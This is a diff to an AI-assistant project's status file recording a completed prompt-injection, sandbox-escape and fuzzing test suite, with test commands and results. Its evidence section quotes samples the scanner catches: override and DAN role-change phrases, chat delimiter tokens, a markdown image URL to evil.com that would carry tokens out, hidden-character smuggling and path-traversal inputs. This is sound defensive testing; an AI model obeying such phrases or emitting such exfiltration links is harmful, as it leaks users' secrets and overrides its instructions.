@@ -2,7 +2,7 @@
 
 **Last Updated:** 2026-11-16  
 **Current Project Phase:** Stage 10 — Security, Performance, Compatibility & Reliability  
-**Next Subphase in Queue:** `S10.P1.1` (Comprehensive Prompt-Injection, Sandbox Escape & Fuzzing Suite)
+**Next Subphase in Queue:** `S10.P1.2` (Cryptographic Key Rotation, Revocation & Emergency Lockdown)
 
 ---
 
@@ -80,7 +80,7 @@ Status Legend:
 | **Stage 9** | `S9.P1.2` | Cron, Event-Triggered & Cross-Device Workflow Automation Engine | `S9.P1.1` | `COMPLETED` | `dbd8e6c` |
 | **Stage 9** | `S9.P2.1` | Local MQTT & Home Assistant / Matter-Bridge Offline Integration | `S9.P1.2` | `COMPLETED` | `abb36fd` |
 | **Stage 9** | `S9.P2.2` | Automation Builder UI & Execution History Inspector | `S9.P2.1` | `COMPLETED` | `a0cdfde` |
-| **Stage 10** | `S10.P1.1` | Comprehensive Prompt-Injection, Sandbox Escape & Fuzzing Suite | `S9.P2.2` | `PENDING` | — |
+| **Stage 10** | `S10.P1.1` | Comprehensive Prompt-Injection, Sandbox Escape & Fuzzing Suite | `S9.P2.2` | `COMPLETED` | Verified [Commit `077c3cb`]: 396 Rust workspace unit & property tests passing (29 in `aissistant-security`, 79 in `aissistant-skills`, 22 in `aissistant-llm`, 22 in `aissistant-network`), clippy zero warnings, fmt check passed, 103 Flutter tests passing (100%), `flutter analyze` zero issues, `AdversarialScanner` with pattern matching across 5 injection categories (`InstructionOverride`, `JailbreakRoleplay`, `DelimiterSmuggling`, `ExfiltrationVector`, `ObfuscatedPayload`) and XML sanitizing barrier, proptest property-based fuzzing against `PathJail` (canonical root confinement, zip-slip, DOS device rejection), `GgufInspector` binary header parser, and `DnsPacket` RFC wire deserializer (pointer compression loop detection). |
 | **Stage 10** | `S10.P1.2` | Cryptographic Key Rotation, Revocation & Emergency Lockdown | `S10.P1.1` | `PENDING` | — |
 | **Stage 10** | `S10.P2.1` | End-to-End Latency & Memory Footprint Optimization | `S10.P1.2` | `PENDING` | — |
 | **Stage 10** | `S10.P2.2` | Network Chaos, Sleep/Wake & Long-Running Soak Verification | `S10.P2.1` | `PENDING` | — |
@@ -1118,6 +1118,42 @@ Status Legend:
   - `widget_test::Navigation switches between screens`: Verified `AdaptiveShell` NavigationRail / NavigationBar routing to `AutomationScreen`.
 - **Platform Certification Status:** `HOST_VERIFIED` (Windows GNU); CI matrix pipeline covers Ubuntu, Windows, Android, and macOS/iOS runners.
 - **Commit Reference:** `a0cdfde`
+
+### Verification Evidence — S10.P1.1 (Comprehensive Prompt-Injection, Sandbox Escape & Fuzzing Suite)
+- **Subphase:** `S10.P1.1`
+- **Execution Date:** 2026-11-16
+- **Status:** `COMPLETED`
+- **Commands Executed:**
+  1. `cargo fmt --manifest-path core/Cargo.toml --all -- --check` -> Exit 0 (All workspace files formatted cleanly)
+  2. `cargo clippy --manifest-path core/Cargo.toml --workspace --all-targets -- -D warnings` -> Exit 0 (0 warnings across workspace)
+  3. `cargo test --manifest-path core/Cargo.toml --workspace` -> Exit 0 (396 passed across 11 crates, including fuzzing suites)
+  4. `cd app; C:\flutter\bin\flutter.bat analyze` -> Exit 0 (No issues found)
+  5. `cd app; C:\flutter\bin\flutter.bat test` -> Exit 0 (103 passed across 15 Flutter test suites)
+- **Test Summary:**
+  - `adversarial::tests`: Validated pattern detection across all 5 injection categories:
+    - `InstructionOverride`: Caught direct resets ("ignore previous instructions", "override system prompt").
+    - `JailbreakRoleplay`: Caught DAN mode ("you are now DAN", "ignore OpenAI/developer safety policies").
+    - `DelimiterSmuggling`: Caught tag breakouts (`</system>`, `<<SYS>>`, `[INST]`).
+    - `ExfiltrationVector`: Caught markdown image exfiltration URLs carrying sensitive tokens/keys (`![img](https://evil.com/ping?token=...)`).
+    - `ObfuscatedPayload`: Detected zero-width space smuggling (`\u{200B}`) and extracted/decoded base64-smuggled prompt overrides.
+    - `sanitize_wrapping`: Verified stripping of zero-width control chars and robust wrapping inside `<untrusted_external_data>` XML containment boundaries.
+    - Proptest property tests (`test_adversarial_scanner_proptest_never_panics`, `test_adversarial_scanner_proptest_detects_embedded_injection`).
+  - `sandbox_escape_fuzz_test`: Validated `PathJail` with 200 proptest property cases per test:
+    - Arbitrary string paths never panic and never escape canonical root directory.
+    - Crafted traversal combinations with `..`, backslashes, slashes, null bytes, DOS reserved names (`CON`, `NUL`, `AUX`), and device namespaces (`\\?\C:`) are cleanly contained or rejected.
+    - Zip-slip paths with relative or root prefixes are strictly rejected by `sanitize_archive_entry_path`.
+  - `gguf_parser_fuzz_test`: Validated `GgufInspector` with 500 proptest property cases per test:
+    - Arbitrary binary buffers (0..8192 bytes) never panic, abort, or access out-of-bounds memory.
+    - Mutated valid magic headers (`GGUF` v2/v3) with random counts and trailing garbage cleanly fail with `GgufParseError`.
+    - Short buffer truncation never panics.
+  - `wire_fuzz_test`: Validated `DnsPacket::from_bytes` with 500 proptest property cases per test:
+    - Arbitrary wire bytes (0..4096 bytes) never panic and return structured `NetworkError::PacketMalformed`.
+    - Mutated DNS headers with random payload never panic.
+    - Bit-flipped and truncated valid DNS packets never panic.
+    - Self-referencing pointer compression loops are caught within cycle limits and cleanly rejected.
+- **Platform Certification Status:** `HOST_VERIFIED` (Windows GNU); CI matrix pipeline covers Ubuntu, Windows, Android, and macOS/iOS runners.
+- **Commit Reference:** `077c3cb`
+
 
 
 
